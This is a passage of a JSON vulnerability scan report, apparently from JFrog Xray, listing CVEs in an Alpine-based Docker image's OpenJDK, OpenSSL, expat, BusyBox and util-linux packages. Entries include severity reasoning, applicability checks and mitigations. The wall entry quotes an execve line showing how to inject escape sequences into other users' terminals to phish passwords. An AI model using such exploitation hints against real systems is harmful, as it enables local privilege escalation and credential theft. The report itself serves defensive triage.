                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35550",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-598139",
                    "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
                    "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-28085"
                        }
                    ],
                    "created": "2024-04-12T00:00:00.778Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libuuid:2.33.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
                        "full_description": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                                "is_positive": true
                            },
                            {
                                "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                                "description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploiting the issue requires the user to interact with the vulnerable software",
                                "description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                                "description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                                "is_positive": false
                            }
                        ],
                        "remediation": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-28085",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-599300",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22; Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22; Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21085",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-04-25T00:00:00.661Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21085",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-632766",
                    "summary": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "description": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-4741"
                        }
                    ],
                    "created": "2024-09-03T00:00:00.909Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-4741",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>SSL_free_buffers</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2024-4741",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>SSL_free_buffers</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-4741",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2024-4741",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180056",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-2388",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.1/CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P"
                        }
                    ],
                    "created": "2021-07-22T00:00:00.226Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-2388",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-590285",
                    "summary": "libexpat through 2.5.0 allows a denial of service (resource consumption) because many full reparsings are required in the case of a large token for which multiple buffer fills are needed.",
                    "description": "libexpat through 2.5.0 allows a denial of service (resource consumption) because many full reparsings are required in the case of a large token for which multiple buffer fills are needed.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-52425",
                            "cwe": [
                                "CWE-400"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-02-09T00:00:00.814Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in libexpat may lead to denial of service when parsing a crafted XML document with large tokens.",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has an exploit published",
                                "description": "A PoC demonstrating denial-of-service can be found in Expat's tests.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                                "description": "The issue doesn't require any in-depth knowledge to trigger as a proof-of-concept exists in the official fix commit.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Exploitation of the vulnerability leads to high resource consumption which may lead to denial of service.",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "Exploitation requires passing user-controlled input to an XML parsing function such as `XML_Parse`.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2023-52425",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the next functions are called:</p>\n<ul>\n<li><code>XML_Parse()</code></li>\n<li><code>XML_ParseBuffer()</code></li>\n</ul>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The vulnerable functions are used to parse an attacker-controlled file by chunks.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2023-52425",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190229",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42381",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.439Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `hash_init` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42381",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42381",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42381",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42381",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-256057",
                    "summary": "libexpat before 2.4.9 has a use-after-free in the doContent function in xmlparse.c.",
                    "description": "libexpat before 2.4.9 has a use-after-free in the doContent function in xmlparse.c.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-40674",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "8.1/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-09-24T00:00:00.708Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Expat leads to denial of service when parsing a crafted XML document in multiple pieces.",
                        "full_description": "[Expat](https://libexpat.github.io/) is a widespread XML 1.0 parsing library written in C.\n\nWhen parsing an XML document, a it is required to map tags into entities which represent data items, and can be used throughout the document. In certain situations a specially crafted parsing buffer given to `Expat`'s entity parser, `internalEntityProcessor`, may result in the creation of entities that are no longer available due to the change of the buffer. Specifically, this happens when encountering unclosed tags.\n\nThis type of attack my be caused when the parsing function `doContent` is called subsequently on the same pointed buffer (e.g. via `XML_ResumeParser`), even though its content has changed. \n\nAttackers can only exploit this issue when Expat's XML parsing is performed in multiple steps (for example,, when `isFinal = FALSE` is passed to `XML_ParseBuffer`)\n\nAs a result, a use-after-free may occur, leading to denial of service, and possibly to remote code execution.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "Although the issue can potentially lead to use-after-free, no technical writeup or PoC have demonstrated that this is possible in practice",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "It is less likely for an attacker to be able to change the parsed data buffer in the middle of the parsing operation (after the first `XML_Parse` is called and before `XML_ResumeParser` is called)",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "Exploitation requires passing user-controlled input to an XML parsing function such as `XML_Parse` and having the ability to modify the parsing buffer in-between parsing iterations.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "A PoC causing denial of service can be found in Expat's tests",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-40674",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-40674",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607948",
                    "summary": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
                    "description": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-4304",
                            "cwe": [
                                "CWE-203"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
